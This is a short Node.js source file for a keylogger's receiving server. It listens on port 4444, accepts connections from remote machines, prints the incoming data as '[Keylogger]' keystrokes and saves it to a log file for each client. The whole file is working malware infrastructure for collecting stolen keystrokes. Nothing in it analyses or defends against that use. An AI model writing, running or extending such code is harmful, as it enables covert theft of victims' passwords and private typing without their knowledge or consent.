require('dotenv').config();
const net = require('net');
const fs = require('fs');
const path = require('path');

const HOST = process.env.SERVER_IP || '0.0.0.0';
const PORT = process.env.SERVER_PORT || 4444;

const LOG_DIR = path.join(__dirname, 'logs');
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR);
}

const server = net.createServer((socket) => {
    const clientAddress = `${socket.remoteAddress}:${socket.remotePort}`;
    console.log(`[+] Connection established from ${clientAddress}`);
    const logFile = path.join(LOG_DIR, `${clientAddress.replace(/[:.]/g, '_')}.log`);
    const logStream = fs.createWriteStream(logFile, { flags: 'a' });

    socket.on('data', (data) => {
        const keystroke = data.toString();
        console.log(`[Keylogger] ${clientAddress}: ${keystroke}`);
        logStream.write(keystroke);
    });

    socket.on('close', () => {
        console.log(`[-] Connection closed from ${clientAddress}`);
        logStream.end();
    });

    socket.on('error', (err) => {
        console.error(`[!] Error from ${clientAddress}: ${err.message}`);
    });
});
server.listen(PORT, HOST, () => {
    console.log(` Keylogger server started on ${HOST}:${PORT}`);
});
